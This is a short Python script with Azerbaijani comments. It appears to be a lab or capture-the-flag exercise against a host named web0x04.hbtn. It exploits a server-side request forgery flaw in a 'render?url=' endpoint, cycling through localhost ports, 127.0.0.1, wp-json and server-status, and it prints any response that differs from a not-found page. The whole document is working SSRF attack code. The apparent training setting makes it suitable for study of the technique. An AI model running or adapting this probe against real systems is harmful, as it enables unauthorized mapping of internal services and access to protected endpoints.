import requests

target_base = "http://web0x04.hbtn/render?url="

# Yoxlamaq istədiyimiz daxili portlar və ünvanlar
internal_urls = [
    "http://localhost/",
    "http://localhost:80/",
    "http://localhost:8080/",
    "http://localhost:5000/",
    "http://localhost:3000/",
    "http://127.0.0.1/",
    "http://127.0.0.1:8080/",
    "http://web0x04.hbtn/wp-json/",
    "http://web0x04.hbtn/server-status"
]

for target in internal_urls:
    full_url = target_base + target
    try:
        res = requests.get(full_url, timeout=5)
        print(f"Target: {target} | Status: {res.status_code} | Uzunluq: {len(res.text)}")
        # Əgər 404 və ya standart blog səhifəsindən fərqli bir şey qayıdarsa
        if res.status_code == 200 and "page not found" not in res.text.lower():
            print(f"[+] Maraqlı cavab tapıldı: {target}")
            print(res.text[:300])
            print("-" * 40)
    except Exception as e:
        print(f"Target: {target} | Xəta: {e}")
